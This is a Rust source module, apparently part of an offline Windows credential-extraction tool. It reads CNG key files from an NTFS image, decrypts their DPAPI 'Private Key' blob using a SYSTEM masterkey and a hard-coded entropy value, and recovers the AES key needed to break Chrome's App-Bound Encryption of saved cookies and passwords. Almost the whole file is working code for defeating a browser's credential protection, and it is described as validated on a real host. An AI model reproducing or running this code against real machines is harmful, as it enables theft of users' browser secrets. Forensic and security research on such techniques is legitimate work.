//! Recover the machine CNG "Software KSP" AES key for the Chrome "v3" ABE unwrap.
//!
//! The v20 GCM key material lives partly in a machine CNG "Microsoft Software Key
//! Storage Provider" AES key, persisted on disk under
//! `%ProgramData%\Microsoft\Crypto\SystemKeys` (or `...\Keys`).
//!
//! The elevation service (Chrome ≥ ~140) derives the v20 GCM key as
//! `NCryptDecrypt(ksp_aes_key, wrapped) XOR static_v3_key` (see
//! [`crate::chrome::abe`]). This module recovers that `ksp_aes_key` offline:
//!
//!   1. Read candidate CNG key files from the machine crypto dirs.
//!   2. Find the "Private Key" DPAPI blob inside (a plain DPAPI blob, protected
//!      under a SYSTEM masterkey with the fixed CNG entropy `xT5rZW5qVVbrvpuA\0`).
//!   3. Decrypt it and parse the `KDBM` (BCRYPT_KEY_DATA_BLOB) to get the 32-byte
//!      AES key.
//!
//! Reverse-engineered from Chrome 154 `elevation_service.exe`; validated
//! end-to-end against a real Win11 host.

use std::io::{Read, Seek};

use crate::chrome::disk::MasterkeyResolver;
use crate::chrome::dpapi_decrypt::{decrypt_blob_entropy, parse_blob};

/// Fixed DPAPI application entropy the Software KSP uses for private-key blobs.
const CNG_KSP_ENTROPY: &[u8] = b"xT5rZW5qVVbrvpuA\0";

/// DPAPI blob prefix: version(4)=1 || provider GUID `df9d8cd0-1501-11d1-8c7a-00c04fc297eb`.
const DPAPI_MAGIC: [u8; 20] = [
    0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf, 0x01, 0x15, 0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0,
    0x4f, 0xc2, 0x97, 0xeb,
];

/// `BCRYPT_KEY_DATA_BLOB_MAGIC` = 'KDBM' little-endian.
const KDBM_MAGIC: u32 = 0x4d42_444b;

/// Machine crypto dirs holding CNG Software-KSP key files.
const CRYPTO_DIRS: &[&str] = &[
    r"ProgramData\Microsoft\Crypto\SystemKeys",
    r"ProgramData\Microsoft\Crypto\Keys",
];

/// Cap on how many / how large candidate key files we read, to bound work on a
/// machine with many CNG keys.
const MAX_FILES: usize = 64;
const MAX_FILE_LEN: usize = 64 * 1024;

/// Read candidate CNG Software-KSP key files from the machine crypto dirs.
///
/// Keeps files that look like a CNG key blob (contain a DPAPI blob) — decryption
/// and KSP-key extraction happen later in [`resolve_ksp_aes_keys`], once the
/// SYSTEM masterkey resolver is available.
pub fn read_cng_ksp_files<R: Read + Seek>(ntfs: &ntfs::Ntfs, reader: &mut R) -> Vec<Vec<u8>> {
    let Ok(root) = ntfs.root_directory(reader) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for dir in CRYPTO_DIRS {
        let Ok(d) = crate::sam::navigate_to_dir(ntfs, &root, reader, dir) else {
            continue;
        };
        let Ok(entries) = crate::sam::list_directory(ntfs, &d, reader) else {
            continue;
        };
        for (name, is_dir) in entries {
            if is_dir || out.len() >= MAX_FILES {
                continue;
            }
            let Ok(file) = crate::sam::find_entry(ntfs, &d, reader, &name) else {
                continue;
            };
            let Ok(bytes) = crate::sam::read_file_data(&file, reader) else {
                continue;
            };
            if bytes.len() <= MAX_FILE_LEN && find_dpapi_blobs(&bytes).next().is_some() {
                out.push(bytes);
            }
        }
    }
    if !out.is_empty() {
        log::info!("[chrome] found {} candidate CNG KSP key file(s)", out.len());
    }
    out
}

/// Byte offsets of every DPAPI blob (version+provider-GUID prefix) in `buf`.
fn find_dpapi_blobs(buf: &[u8]) -> impl Iterator<Item = usize> + '_ {
    (0..buf.len().saturating_sub(DPAPI_MAGIC.len()))
        .filter(move |&i| buf[i..i + DPAPI_MAGIC.len()] == DPAPI_MAGIC)
}

/// Recover the NCrypt AES key from each candidate CNG file.
///
/// Decrypts every candidate's "Private Key" blob with `resolver` and the CNG
/// entropy, returning each 32-byte AES key. The caller tries each against a v3
/// blob (the GCM tag validates the right one).
pub fn resolve_ksp_aes_keys<S: MasterkeyResolver>(
    files: &[Vec<u8>],
    resolver: &S,
) -> Vec<[u8; 32]> {
    let mut keys = Vec::new();
    for bytes in files {
        if let Some(k) = extract_aes_key(bytes, resolver) {
            if !keys.contains(&k) {
                keys.push(k);
            }
        }
    }
    keys
}

/// Find the "Private Key" DPAPI blob in one CNG key file, decrypt it, and parse
/// the `KDBM` structure to return the 32-byte AES key.
fn extract_aes_key<S: MasterkeyResolver>(cng: &[u8], resolver: &S) -> Option<[u8; 32]> {
    for off in find_dpapi_blobs(cng) {
        let Ok(blob) = parse_blob(&cng[off..]) else {
            continue;
        };
        // The AES key lives in the "Private Key" blob (not "Private Key Properties").
        if blob.description != "Private Key" {
            continue;
        }
        let Some(mk) = resolver.resolve(&blob.mk_guid_str) else {
            continue;
        };
        let Ok(dec) = decrypt_blob_entropy(&blob, &mk, CNG_KSP_ENTROPY) else {
            continue;
        };
        if let Some(key) = parse_kdbm(&dec) {
            return Some(key);
        }
    }
    None
}

/// Parse a `BCRYPT_KEY_DATA_BLOB`: magic 'KDBM' | version(4) | cbKeyData(4) | key.
/// Returns the 32-byte key when `cbKeyData == 32`.
fn parse_kdbm(data: &[u8]) -> Option<[u8; 32]> {
    if data.len() < 12 || u32::from_le_bytes(data[0..4].try_into().ok()?) != KDBM_MAGIC {
        return None;
    }
    let cb = u32::from_le_bytes(data[8..12].try_into().ok()?) as usize;
    if cb != 32 || data.len() < 12 + 32 {
        return None;
    }
    data[12..44].try_into().ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_kdbm_extracts_32_byte_key() {
        let mut blob = Vec::new();
        blob.extend_from_slice(&KDBM_MAGIC.to_le_bytes());
        blob.extend_from_slice(&1u32.to_le_bytes()); // version
        blob.extend_from_slice(&32u32.to_le_bytes()); // cbKeyData
        blob.extend_from_slice(&[0xAB; 32]);
        assert_eq!(parse_kdbm(&blob), Some([0xAB; 32]));
    }

    #[test]
    fn parse_kdbm_rejects_wrong_magic_or_size() {
        assert_eq!(parse_kdbm(&[0u8; 44]), None);
        let mut blob = Vec::new();
        blob.extend_from_slice(&KDBM_MAGIC.to_le_bytes());
        blob.extend_from_slice(&1u32.to_le_bytes());
        blob.extend_from_slice(&16u32.to_le_bytes()); // wrong size
        blob.extend_from_slice(&[0xAB; 16]);
        assert_eq!(parse_kdbm(&blob), None);
    }
}
